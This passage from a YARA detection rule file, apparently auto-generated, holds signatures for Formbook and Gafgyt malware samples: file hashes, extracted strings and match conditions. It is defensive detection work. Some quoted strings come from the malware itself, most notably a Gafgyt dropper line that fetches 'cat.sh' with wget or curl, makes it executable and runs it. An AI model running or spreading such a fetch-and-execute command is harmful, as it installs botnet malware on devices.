      $s12 = "get_PreviousSaveFilePath" fullword ascii /* score: '9.00'*/
      $s13 = "get_PreviouslySelectedListItemName" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__Ga_gyt_signature__431eaf4e_Ga_gyt_signature__8da6474c_Ga_gyt_signature__c9d27f1a_Ga_gyt_signature__d06bbd_28 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature).elf, Ga-gyt(signature)_431eaf4e.elf, Ga-gyt(signature)_8da6474c.elf, Ga-gyt(signature)_c9d27f1a.elf, Ga-gyt(signature)_d06bbde6.elf, Ga-gyt(signature)_d3a381e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "badbdf9d6e147862f9bccb34ad624a5aa705aebb05306687560f1dc699a87d50"
      hash2 = "431eaf4e92104050175506be59bff461c2fb7f8a134c7328b932fea657db0f34"
      hash3 = "8da6474cc31eddd180e1436dffa02880f44d024890967ee61ec12b6dd9485cea"
      hash4 = "c9d27f1afa200613296f2ed4267e05564e54d74dadf433a51bb82ca3a79325cb"
      hash5 = "d06bbde61018471ebd586072483c851cf05e4eca89d6345d2142c92a11aabd48"
      hash6 = "d3a381e7d3ab8913cbaa5b7727c938de321fc642ac14467862c7a8f4ba696639"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s4 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s5 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s6 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
      $s7 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s8 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s11 = "large-dns.akamai.com" fullword ascii /* score: '18.00'*/
      $s12 = "any.cdn77.com" fullword ascii /* score: '18.00'*/
      $s13 = "process_killer_loop" fullword ascii /* score: '15.00'*/
      $s14 = "killer_process" fullword ascii /* score: '15.00'*/
      $s15 = "kill_process" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__10898c09_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_29 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_10898c09.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_244d604b.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a8cec5e3.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ce0f47ca.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eef3e30f.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd853f10.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "10898c09830634012bc320ad02afc6120f285bada5b22db95687d0796e3d86d6"
      hash2 = "244d604b8eaa9d2422ec6474250493e056c3322007945d11f6bbb991495c9234"
      hash3 = "a8cec5e33f7270e2e3d463c42aea7ee63825c8a4abe083be79ff3c6f123da63e"
      hash4 = "ce0f47ca5f60cebadab63f145ea3c3cb41cb29a55d245ff4586464afd68aec1d"
      hash5 = "eef3e30fb0a0404549b189ff4f5a799694b88d3f3b608d422fb2f93559804b21"
      hash6 = "fd853f10022edbf3ee9b2601b31344f8ea537de6fa182b393bda9504a9e918d6"
   strings:
      $s1 = "https://bloggingmetrics.com/" fullword wide /* score: '22.00'*/
      $s2 = "GetInjectedInstance" fullword ascii /* score: '19.00'*/
      $s3 = "GetConstructorInjectAttribute" fullword ascii /* score: '19.00'*/
      $s4 = "GetPropertyInjectAttribute" fullword ascii /* score: '19.00'*/
      $s5 = "get_DependencyInjector" fullword ascii /* score: '19.00'*/
      $s6 = "andExecuteFollowingCode" fullword ascii /* score: '18.00'*/
      $s7 = "Login Faild" fullword wide /* score: '18.00'*/
      $s8 = "Unable to inject a parameter that is not an interface or abstract type." fullword wide /* score: '18.00'*/
      $s9 = "SELECT * FROM tbl_users WHERE username = '" fullword wide /* score: '16.00'*/
      $s10 = "Login_and_Register.Properties" fullword ascii /* score: '15.00'*/
      $s11 = "clickLogin" fullword wide /* score: '15.00'*/
      $s12 = "frmLogin" fullword wide /* score: '15.00'*/
      $s13 = "Login_and_Register.frmRegister.resources" fullword ascii /* score: '15.00'*/
      $s14 = "Login_and_Register.frmDashboard.resources" fullword ascii /* score: '15.00'*/
      $s15 = "clickLogin_Click" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0f0b4391_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_30 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0f0b4391.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d89c1f0.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4c8b060d.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4f897b13.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7cae6766.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b4988079.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c948ad08.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_decdb74e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0f0b43916bc424c5d874e6f06a9f259f9f3b1f649da85ec931ad024914b81177"
      hash2 = "1d89c1f0c98af3259f5584f6975d5478c33e2b18019e3559c0959f2c2312e5fd"
      hash3 = "4c8b060d9a7c44a8d510660edc86cc51976415dd2a8d3ad40bfec23820f49daa"
      hash4 = "4f897b135d89fd4fae9653b4ee0e7ac959c478cc12734ec5fe887d6ac92680cc"
      hash5 = "7cae6766c6772f6d335043becb1ff4927371c0090d249c11ebe6f6fe7d810b7c"
      hash6 = "b498807992cd0b5e151f3788ab97e7fb4f4381ce96ee7f80a0397ca9383db96f"
      hash7 = "c948ad083bfa08ede99c76cdafa83866cb46983cbbe0df5aba6f9bebfe4abaf5"
      hash8 = "decdb74ebd6bcdf8e64941b717e7830a401490f3d37437cc2110afcbc64d6606"
   strings:
      $s1 = "daybreak.exe" fullword wide /* score: '22.00'*/
      $s2 = "DaybreakDX.exe" fullword wide /* score: '22.00'*/
      $s3 = "/config.dat" fullword wide /* score: '14.00'*/
      $s4 = "/addresslist.txt" fullword wide /* score: '14.00'*/
      $s5 = "getCurrentListAddress" fullword ascii /* score: '12.00'*/
      $s6 = "getAddresses" fullword ascii /* score: '12.00'*/
      $s7 = "HigurashiDaybreakConfig.FormMyConf.resources" fullword ascii /* score: '10.00'*/
      $s8 = "HigurashiDaybreakConfig.FormConfig.resources" fullword ascii /* score: '10.00'*/
      $s9 = "config.json" fullword wide /* score: '10.00'*/
      $s10 = "getVolsound" fullword ascii /* score: '9.00'*/
      $s11 = "getVolmusic" fullword ascii /* score: '9.00'*/
      $s12 = "getVolvoice" fullword ascii /* score: '9.00'*/
      $s13 = "getShadows" fullword ascii /* score: '9.00'*/
      $s14 = "get_GameFolder" fullword ascii /* score: '9.00'*/
      $s15 = "getFolder" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__227d7f53_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_31 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_227d7f53.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ae8ef5ed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "227d7f535bcb6ce158d63d9436429547e9a065b289cf8b0caf8993ddd549190d"
      hash2 = "ae8ef5ed53654de05a32d157f76dfbdc2e734f842c3b815ec2ef5f37fd24f157"
   strings:
      $s1 = "get_DigitalRoot" fullword ascii /* score: '12.00'*/
      $s2 = "GetDigitalRoot" fullword ascii /* score: '12.00'*/
      $s3 = "Primes_{0}_{1}.txt" fullword wide /* score: '11.00'*/
      $s4 = "GetNthPrime" fullword ascii /* score: '9.00'*/
      $s5 = "GetProperDivisors" fullword ascii /* score: '9.00'*/
      $s6 = "GetDigitSum" fullword ascii /* score: '9.00'*/
      $s7 = "get_IsPalindromic" fullword ascii /* score: '9.00'*/
      $s8 = "get_IsAbundant" fullword ascii /* score: '9.00'*/
      $s9 = "get_IsHappy" fullword ascii /* score: '9.00'*/
      $s10 = "get_IsPrime" fullword ascii /* score: '9.00'*/
      $s11 = "<GetPrimesWithDigitSum>b__0" fullword ascii /* score: '9.00'*/
      $s12 = "GetPrimeFactorization" fullword ascii /* score: '9.00'*/
      $s13 = "get_IsArmstrong" fullword ascii /* score: '9.00'*/
      $s14 = "get_PrimeFactors" fullword ascii /* score: '9.00'*/
      $s15 = "GetFirstNPrimes" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2ddb84d6.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_542cc164.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_85853327.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e1fe0b90.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16ed2c1ca3967a5d35b8ed2607aa76b4be05d6a51b89c97a46a3c37f6a579814"
      hash2 = "2ddb84d64c1157567966a54a21b5a64ccf13d6641a9657807fa7a50713531cff"
      hash3 = "542cc164aa04d17dcb1abc62c982d85db3774587b08af2c13e97aba02d164562"
      hash4 = "858533276fe2058efd23b93879c692facaf413579f528c248b3b1be66b4cca97"
      hash5 = "e1fe0b9026bf4452a4f6d0a21af6c38e151fe5f1a8c6b547074798c25915456f"
   strings:
      $s1 = "Player: {0} - AI: {1}" fullword wide /* score: '12.00'*/
      $s2 = "  Game {0}: {1} ({2}) vs {3} ({4}) - {5}" fullword wide /* score: '12.00'*/
      $s3 = "{0} vs {1} - Winner: {2}" fullword wide /* score: '12.00'*/
      $s4 = "get_Player1Choice" fullword ascii /* score: '9.00'*/
      $s5 = "get_Player1" fullword ascii /* score: '9.00'*/
      $s6 = "GetMatchesByRound" fullword ascii /* score: '9.00'*/
      $s7 = "get_RoundsToWin" fullword ascii /* score: '9.00'*/
      $s8 = "get_Player2" fullword ascii /* score: '9.00'*/
      $s9 = "get_Player2Choice" fullword ascii /* score: '9.00'*/
      $s10 = "GetTotalRounds" fullword ascii /* score: '9.00'*/
      $s11 = "<GetTotalRounds>b__22_0" fullword ascii /* score: '9.00'*/
      $s12 = "<GetMatchesByRound>b__0" fullword ascii /* score: '9.00'*/
      $s13 = "get_TournamentWins" fullword ascii /* score: '9.00'*/
      $s14 = "GetRoundName" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1f9e0b93_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_33 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1f9e0b93.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cab82749.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ee9bd24e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1f9e0b93f46f8d3a082b8504b723df366b34fe38c093dbf910660a259ee1761d"
      hash2 = "cab82749acbaf6bab5ad3c2bb077bac408ae9d1e798e54b8599ca2ce12c88311"
      hash3 = "ee9bd24e9f97fcbaa751e1d7d0797cb063d261619407366dc742c5a398d1b5d7"
   strings:
      $s1 = "<GetSystemPrinters>b__12_0" fullword ascii /* score: '19.00'*/
      $s2 = "GetSystemPrinters" fullword ascii /* score: '19.00'*/
      $s3 = "Contract_Template.pdf" fullword wide /* score: '14.00'*/
      $s4 = "<GetCompletedJobsCount>b__19_0" fullword ascii /* score: '12.00'*/
      $s5 = "GetCompletedJobsCount" fullword ascii /* score: '12.00'*/
      $s6 = "Meeting_Notes.txt" fullword wide /* score: '11.00'*/
      $s7 = "Report_Q3_2023.pdf" fullword wide /* score: '10.00'*/
      $s8 = "john.doe" fullword wide /* score: '10.00'*/
      $s9 = "GetNextJobId" fullword ascii /* score: '9.00'*/
      $s10 = "GetTotalJobsCount" fullword ascii /* score: '9.00'*/
      $s11 = "get_QueueLength" fullword ascii /* score: '9.00'*/
      $s12 = "GetPrintJobsByStatus" fullword ascii /* score: '9.00'*/
      $s13 = "GetPrintJobsByPrinter" fullword ascii /* score: '9.00'*/
      $s14 = "get_SubmittedTime" fullword ascii /* score: '9.00'*/
      $s15 = "get_FileSizeBytes" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5af12d4e_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_34 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5af12d4e.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9037c923.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5af12d4e35c3f1b595d9a0bac82476e2657547ebc7c622f721b81462fd4dac9d"
      hash2 = "9037c923df1785d5acc630ddfd5155b30abac35380613777e123fdd8fd5d2028"
   strings:
      $s1 = "<ProcessClientRequests>b__18_3" fullword ascii /* score: '15.00'*/
      $s2 = "<ProcessClientRequests>b__4" fullword ascii /* score: '15.00'*/
      $s3 = "<ProcessClientRequests>b__0" fullword ascii /* score: '15.00'*/
      $s4 = "<ProcessClientRequests>b__2" fullword ascii /* score: '15.00'*/
      $s5 = "<ProcessClientRequests>b__1" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessClientRequests" fullword ascii /* score: '15.00'*/
      $s7 = "<ProcessClientRequests>b__18_5" fullword ascii /* score: '15.00'*/
      $s8 = "../../../Resources/7z.dll" fullword wide /* score: '15.00'*/
      $s9 = "Problem processing client requests. " fullword wide /* score: '15.00'*/
      $s10 = "Finished processing client requests for client: " fullword wide /* score: '15.00'*/
      $s11 = "Send Command" fullword wide /* score: '14.00'*/
      $s12 = "_clientCommandTextBox" fullword wide /* score: '12.00'*/
      $s13 = "SendCommandButtonHandler" fullword ascii /* score: '12.00'*/
      $s14 = "_sendCommandButton" fullword wide /* score: '12.00'*/
      $s15 = "Problem sending command to clients" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__431eaf4e_Ga_gyt_signature__8da6474c_Ga_gyt_signature__d06bbde6_Ga_gyt_signature__d3a381e7_35 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_431eaf4e.elf, Ga-gyt(signature)_8da6474c.elf, Ga-gyt(signature)_d06bbde6.elf, Ga-gyt(signature)_d3a381e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "431eaf4e92104050175506be59bff461c2fb7f8a134c7328b932fea657db0f34"
      hash2 = "8da6474cc31eddd180e1436dffa02880f44d024890967ee61ec12b6dd9485cea"
      hash3 = "d06bbde61018471ebd586072483c851cf05e4eca89d6345d2142c92a11aabd48"
      hash4 = "d3a381e7d3ab8913cbaa5b7727c938de321fc642ac14467862c7a8f4ba696639"
   strings:
      $s1 = "Origin: https://%s.com" fullword ascii /* score: '24.00'*/
      $s2 = "Origin: https://www.instagram.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s6 = "X-Akamai-Origin: https://www.example.com" fullword ascii /* score: '21.00'*/
      $s7 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s8 = "Origin: https://www.microsoft.com" fullword ascii /* score: '21.00'*/
      $s9 = "Origin: https://www.apple.com" fullword ascii /* score: '21.00'*/
      $s10 = "Referer: https://www.linkedin.com/" fullword ascii /* score: '17.00'*/
      $s11 = "Referer: https://www.facebook.com/" fullword ascii /* score: '17.00'*/
      $s12 = "Referer: https://www.twitter.com/" fullword ascii /* score: '17.00'*/
      $s13 = "Referer: https://www.amazon.com/" fullword ascii /* score: '17.00'*/
      $s14 = "Referer: https://www.instagram.com/" fullword ascii /* score: '17.00'*/
      $s15 = "Referer: https://www.apple.com/" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__a3346c75_Ga_gyt_signature__fd49df84_36 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_a3346c75.elf, Ga-gyt(signature)_fd49df84.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a3346c751947ea632fc3405ea46a20730ce4452067c62100fdcf6c62b30f8dd8"
      hash2 = "fd49df844db6a4e03dac56d1edb17150171b5aa0c14ad92bfae57fbaa82073d0"
   strings:
      $s1 = "POST /login.htm HTTP/1.1" fullword ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '29.00'*/
      $s3 = "command=login&username=%s&password=%s" fullword ascii /* score: '26.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat" ascii /* score: '24.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root/ wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " fullword ascii /* score: '24.00'*/
      $s7 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s8 = "(unknown authentication error - %d)" fullword ascii /* score: '17.00'*/
      $s9 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s10 = "__get_myaddress: ioctl (get interface configuration)" fullword ascii /* score: '15.00'*/
      $s11 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s12 = "Host: %s:554" fullword ascii /* score: '14.50'*/
      $s13 = "RPC: Remote system error" fullword ascii /* score: '13.00'*/
      $s14 = "rsyslogd" fullword ascii /* score: '13.00'*/
      $s15 = "/usr/sbin/syslogd" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1a1e4f5e_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_37 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a1e4f5e.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_390684b6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a1e4f5e5b668ea14d3cfc4f3e65d8638cefe7acc82378245d6b28db9a070d31"
      hash2 = "390684b6b7f8d3599995c168813e51787cdcdfe686ac5ad637b3a0a085bc09a4"
   strings:
      $s1 = "GenerateExportContent" fullword ascii /* score: '12.00'*/
      $s2 = "Analogous" fullword wide /* score: '11.00'*/
      $s3 = "ColorSchemeGenerator.ExportForm.resources" fullword ascii /* score: '10.00'*/
      $s4 = "GetFileFilter" fullword ascii /* score: '9.00'*/
      $s5 = "GenerateAnalogous" fullword ascii /* score: '9.00'*/
      $s6 = "GetColorHex" fullword ascii /* score: '9.00'*/
      $s7 = "get_SchemeType" fullword ascii /* score: '9.00'*/
      $s8 = "{0} ({1}) - {2} colors" fullword wide /* score: '9.00'*/
      $s9 = "Export Color Scheme" fullword wide /* score: '9.00'*/
      $s10 = "Complementary" fullword wide /* score: '9.00'*/
      $s11 = "  --color-{0}: {1};" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5_f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb74_38 {
   meta:
      description = "_subset_batch - from files e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5_e8b33af5.elf, f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4_f09e1577.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e8b33af5f925a9f81785c84066212ab0a0b6c3c8894e669f988a8bd6dea9d4e5"
      hash2 = "f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4"
   strings:
      $s1 = "math.log" fullword ascii /* score: '19.00'*/
      $s2 = "IIIIIIIIIII" fullword wide /* reversed goodware string 'IIIIIIIIIII' */ /* score: '16.50'*/
      $s3 = "runtime.spanSetSpinePointer.lookup" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.fge64" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.fcmp64" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.fuint64to64" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.fintto64" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.save_g" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.fmul64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.fint64to64" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.load_g" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.walltime" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.(*hchan).sortkey" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fint32to64" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.feq64" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__003ce48e_Ga_gyt_signature__47196d36_Ga_gyt_signature__4eac2012_Ga_gyt_signature__594dbcd5_Ga_gyt_signatur_39 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_003ce48e.elf, Ga-gyt(signature)_47196d36.elf, Ga-gyt(signature)_4eac2012.elf, Ga-gyt(signature)_594dbcd5.elf, Ga-gyt(signature)_5bb6b335.elf, Ga-gyt(signature)_684668d3.elf, Ga-gyt(signature)_6a4c3ee6.elf, Ga-gyt(signature)_729fdb58.elf, Ga-gyt(signature)_962c7912.elf, Ga-gyt(signature)_995e632e.elf, Ga-gyt(signature)_a33aa07b.elf, Ga-gyt(signature)_ba8cefa1.elf, Ga-gyt(signature)_bcc239c8.elf, Ga-gyt(signature)_c1083f40.elf, Ga-gyt(signature)_c5242cba.elf, Ga-gyt(signature)_c94a6da1.elf, Ga-gyt(signature)_cf9a897f.elf, Ga-gyt(signature)_d92a82bd.elf, Ga-gyt(signature)_e4393a49.elf, Ga-gyt(signature)_e6e0d533.elf, Ga-gyt(signature)_f0fb5d22.elf, Ga-gyt(signature)_fba645a0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "003ce48e01614fa49fbf7197243d32349c0eab85190798cc2131a6f22f9e4d74"
      hash2 = "47196d36b4afcb3d207b77b14b007e962d1d11410b888b261061a77e08c45838"
      hash3 = "4eac2012cc32fd0d6543ee29f68c01081b08911bcd9af23364e9c4b73b76f303"
      hash4 = "594dbcd51c2c9eb879668bcc58a364d6951319c532cda3947747a495e41a9942"
      hash5 = "5bb6b335d5df8e953dafe382ef810d5629fa15f959655c1fcbe2af815ad4bb13"
      hash6 = "684668d3065daad253570100f3b947a50aad9be3e4429d02c156176899e23e60"
      hash7 = "6a4c3ee666b2242fecdac3853bebaad56f3af0c59130e0d344ede095c271b805"
      hash8 = "729fdb587dd9b93b8d689209d68b2ef32678cb3263177d79e443046fb278c93c"
      hash9 = "962c7912c44af279cd7879402913ca17968a64788b041b855867d42bf0441387"
      hash10 = "995e632e29a9c2635cfc9f693950e3ad07ae18028968e1427b306bb72e573a00"
      hash11 = "a33aa07b8f51e7bfee450b08b563fb72d93834f9955ad189795a49532f3cce97"
      hash12 = "ba8cefa13974bc2d0c7dae716386c4f64f2e91a86c60807ac6fe3a4efa625751"
      hash13 = "bcc239c8ac93b5b198fd4c5be8da9a252ef9149fcc3c13986d364826a9c8d900"
      hash14 = "c1083f406437651d99f4b0a6fdbb3dc57f7268fc3c1f071b8330007ca9f36de6"
      hash15 = "c5242cbaba6987811e70eb8a9ef4ed15c0b4771245e0d46d09c9b32d3ae1ede3"
      hash16 = "c94a6da1e05a9fb1f059241b44f1904f2cd454c4130921f6156584dc9840f6c4"
      hash17 = "cf9a897fadec97206fe1f75f6978a04c333d37ac418fc1525bcabe3f13f225a0"
      hash18 = "d92a82bd103c2270d823c70dc507b3068d7492b9497243a16a14e6e1134ddafc"
      hash19 = "e4393a49350ed5e410e1cf286c4b8b6df29224348c9972aadcded5cb74874fba"
      hash20 = "e6e0d5334a6b305ecb60f563aa16cb5d47ffa420a03799c030ac51d3ab869ff3"
      hash21 = "f0fb5d225ee6ae75855c8bbf27fe940c9bbf506a5d05f3c1323c305a067507d7"
      hash22 = "fba645a024ac9b5c445a7753062271985a3be52a3ccd8d9bd3b56db81e1a4d5c"
   strings:
      $s1 = "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/3" ascii /* score: '17.00'*/
      $s2 = "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0" ascii /* score: '17.00'*/
      $s3 = "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)" fullword ascii /* score: '16.00'*/
      $s4 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)" fullword ascii /* score: '15.00'*/
      $s5 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911" fullword ascii /* score: '14.00'*/
      $s7 = "chickennuggets" fullword ascii /* score: '13.00'*/
      $s8 = "stdudpbasedflood" fullword ascii /* score: '13.00'*/
